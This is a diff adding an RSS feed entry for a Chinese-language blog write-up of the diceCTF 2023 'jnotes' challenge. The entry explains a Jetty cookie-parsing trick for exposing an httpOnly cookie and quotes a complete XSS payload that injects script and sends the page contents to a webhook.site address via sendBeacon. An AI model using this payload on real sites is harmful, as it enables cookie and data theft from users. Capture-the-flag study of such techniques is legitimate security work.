@@ -36,6 +36,20 @@ var _OPTS_PASSABLE_WITH_DATA = [&amp;#39;delimiter&amp;#39;, &amp;#39;scope&amp;
     </item>
     
     <item>
+      <title>diceCTF2023 WP</title>
+      <link>http://blog.an4er.top/post/dicectf/</link>
+      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/dicectf/</guid>
+      <description>jnotes 题目总体代码很短，有一个XSS的点，flag在cookie中，被设置为httpOnly，所以目的是偷取cookie。
+因为唯一的回显点在后端会输出note这个cookie的值到前端，我们才能获得，所以突破点在后端，后端就是一个简单的javalin程序，我最后的尝试是想能不能根据编码的差别在存储cookie时，设置类似;的符号去混乱cookie的键值对，尝试失败，会抛出RFC协议不允许；作为cookie的值，后来也看了下javalin关于cookie的文档和源码调试，没发现啥点
+复现发现javalin是基于jetty的，靠了、光顾着看javalin没看jetty。在/jetty-http/src/main/java/org/eclipse/jetty/http/CookieCutter.java中，看到了jetty是这么解析接收到的cookie的，如果遇到&amp;quot;，则到&amp;quot;结束的当作一个值
+因为note也是httpOnly的，所以也无法使用js去设置它的值，这里利用document.cookie=&#39;=note=&amp;quot;;path=//&#39;;创建键为空，值为note的cookie，发送时也就是 note=&amp;quot;....这里为了让note在最前面以可以覆盖掉后面的值所以让path的路径较长与FLAG
+Cookies with longer path are listed before cookies with shorter path. Cookies which are edited least recently are listed before cookies which are edited most recently. 引用及payload来自https://github.com/RohitNarayananM/blog/tree/main/dicectf23-writeups/jnotes
+&amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://jnotes.mc.ax/create&amp;#34;&amp;gt; &amp;lt;input id=&amp;#34;p&amp;#34; name=&amp;#34;note&amp;#34; value=&amp;#34;&amp;#34; &amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.querySelector(&amp;#34;#p&amp;#34;).value = `&amp;lt;/textarea&amp;gt; &amp;lt;\x73cript&amp;gt; document.cookie=&amp;#39;=note=&amp;#34;;path=//&amp;#39;; const frame = document.createElement(&amp;#39;iframe&amp;#39;); frame.src = &amp;#34;https://jnotes.mc.ax//&amp;#34;; document.body.appendChild(frame); frame.onload = () =&amp;gt; { navigator.sendBeacon(&amp;#34;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&amp;#34;,frame.contentWindow.document.body.innerHTML); } &amp;lt;/\x73cript&amp;gt;`; document.forms[0].submit(); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; offical https://blog.</description>
+    </item>
+    
+    <item>
       <title>idekCTF 2022 XSS</title>
       <link>http://blog.an4er.top/post/idekxss/</link>
       <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate>
